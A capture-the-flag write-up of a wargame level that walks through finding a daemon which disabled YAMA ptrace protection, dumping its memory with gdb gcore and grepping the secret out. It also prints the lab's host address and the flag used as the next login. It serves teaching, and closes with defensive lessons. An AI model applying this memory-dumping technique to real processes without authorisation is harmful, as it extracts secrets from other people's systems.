# BreachLab - Phantom Track: Level 8 (Live Injection)

## General Information

- **Platform:** [BreachLab](https://breachlab.org)
- **Track:** Phantom Track (Post-Exploitation & Operational Tradecraft)
- **Level:** Level 8 (Live Injection)
- **Host:** `204.168.229.209`
- **Port:** `2223`
- **Current User:** `phantom8`
- **Target Process:** Python Daemon (PID `244125`)
- **Goal:** Identify an in-memory resident secret, leverage YAMA `PR_SET_PTRACER` permissions, generate a live process memory core dump via GDB, and extract the flag
- **Next User / Flag Code:** `bl_phtm8_8290163e0cc52c71`

---

## 1. Scenario & Objectives

Upon logging in via SSH, the MOTD banner and `BRIEFING` detail the mission parameters:

```
MISSION: Live Injection
=======================

A long-running process holds a secret in memory and never writes
it to disk. You can see the process via /proc and, with the right
capability, you can read what it is doing from the outside.

Memory is more honest than the filesystem. Read it.

The daemon runs as your own UID (phantom8) — /proc access is
same-uid, no root required.
```

The objective is to discover active background processes running under the current UID (`phantom8`), inspect `/proc/<PID>/cmdline`, identify that the process explicitly disabled YAMA ptrace restrictions via `prctl(PR_SET_PTRACER, PR_SET_PTRACER_ANY)`, dump the virtual memory space using GDB (`gcore`), and extract the flag from volatile RAM.

---

## 2. Reconnaissance & Process Enumeration

Listing processes owned by `phantom8`:

```bash
phantom8@phantom:~$ ps -u phantom8 -f
UID          PID    PPID  C STIME TTY          TIME CMD
phantom8  244125  244124  0 Jun02 ?        00:00:00 python3 -c  import sys, time, ctypes # y
phantom8  663069  663052  0 20:43 ?        00:00:00 sshd: phantom8@pts/0
phantom8  663070  663069  0 20:43 pts/0    00:00:00 -bash
phantom8  663240  663070  0 20:46 pts/0    00:00:00 ps -u phantom8 -f
```

### Inspecting Process Metadata in `/proc`

Examining the full execution command line of PID `244125`:

```bash
phantom8@phantom:~$ cat /proc/244125/cmdline | tr '\0' ' ' ; echo ""
python3 -c
import sys, time, ctypes
# yama ptrace_scope=1 on Ubuntu blocks same-uid ptrace attach unless the
# tracee explicitly opts in via PR_SET_PTRACER (or scope=0 globally). The
# container inherits the host's read-only /proc/sys/kernel/yama, so we
# can't set scope=0 from the entrypoint. Opt in from inside the daemon:
# PR_SET_PTRACER = 0x59616d61, PR_SET_PTRACER_ANY = (unsigned long)-1.
libc = ctypes.CDLL(None)
libc.prctl(0x59616d61, ctypes.c_ulong(-1).value, 0, 0, 0)
secret = sys.stdin.readline().strip()
sys.stdin.close()
while True:
    time.sleep(60)
```

---

## 3. Vulnerability Mechanism: YAMA LSM & `PR_SET_PTRACER` Opt-In

On modern Linux distributions, the **YAMA Linux Security Module (LSM)** enforces `ptrace_scope=1`, which blocks non-parent processes from using `ptrace` system calls against target processes, even if both processes share the same User ID (UID).

However, the daemon explicitly opts into external debugging by invoking:

```c
prctl(PR_SET_PTRACER, PR_SET_PTRACER_ANY, 0, 0, 0);
```

- `0x59616d61`: `PR_SET_PTRACER` operation code.
- `(unsigned long)-1`: `PR_SET_PTRACER_ANY`, granting permission to **any process with matching UID** to attach and read its virtual memory space via `ptrace`.

---

## 4. Exploitation: In-Memory Core Dumping via GDB

Using GDB non-interactively in batch mode, we attach to PID `244125` and dump its virtual memory map to a physical core file:

```bash
phantom8@phantom:~$ gdb -p 244125 --batch -ex "gcore ~/process.dump"
0x000070a83d95061d in ?? ()
Saved corefile /home/phantom8/process.dump
[Inferior 1 (process 244125) detached]
```

### Parameter Breakdown

- `-p 244125`: Attach to target process PID via `ptrace`.
- `--batch`: Run GDB in non-interactive script mode, detaching immediately after command execution.
- `-ex "gcore ~/process.dump"`: Generate a comprehensive core dump containing all active memory segments (heap, stack, BSS, and anonymous pages).

---

## 5. Memory Forensics & Flag Extraction

We analyze printable strings from the dumped memory image, filtering specifically for the platform flag prefix (`bl_`):

```bash
phantom8@phantom:~$ strings ~/process.dump | grep -E -i "bl_"
bl_phtm8_8290163e0cc52c71
bl_phtm8_8290163e0cc52c71
bl_phtm8_8290163e0cc52c71
```

- **Extracted Flag:** `bl_phtm8_8290163e0cc52c71`

---

## 6. Flag / Credentials Retrieved

| Parameter | Value |
| :--- | :--- |
| **Track** | Phantom Track (Level 8) |
| **Current User** | `phantom8` |
| **Target Process** | Python Daemon (PID `244125`) |
| **Security Mechanism** | YAMA LSM (`ptrace_scope=1`) bypassed via `PR_SET_PTRACER_ANY` |
| **Dumping Utility** | GNU Debugger (`gdb --batch -ex "gcore ..."`) |
| **Discovered Flag** | `bl_phtm8_8290163e0cc52c71` |
| **Memory Dump Path** | `/home/phantom8/process.dump` |

---

## 7. Key Commands & Concepts Reference

- `ps -u <user> -f`: List full command lines and hierarchy of processes for a given user.
- `cat /proc/<PID>/cmdline | tr '\0' ' '`: Recover raw startup command line arguments of a running process.
- `gdb -p <PID> --batch -ex "gcore <path>"`: Non-interactively dump the complete virtual memory map of a running process.
- `strings <file> | grep <pattern>`: Scan binary dumps for ASCII/Unicode strings.
- `prctl(PR_SET_PTRACER, ...)`: Modify kernel-level process tracing restrictions.

---

## 8. Lessons Learned & Defensive Takeaways

1. **Volatile Memory as Primary Attack Surface:** Sensitive data held exclusively in RAM (API keys, decryption keys, plain passwords) can be extracted if an attacker obtains code execution under the same UID and debugging interfaces (`ptrace`, `/proc/<PID>/mem`) are accessible.
2. **Risks of `PR_SET_PTRACER_ANY`:** Setting `PR_SET_PTRACER` to `-1` removes YAMA process boundary protections, allowing peer processes of the same user to inspect memory without root privileges.
3. **Targeted IoC Filtering:** When analyzing high-volume memory dumps, searching for precise token indicators (such as `bl_` or header signatures) avoids false positives from system runtime symbols and shared libraries.
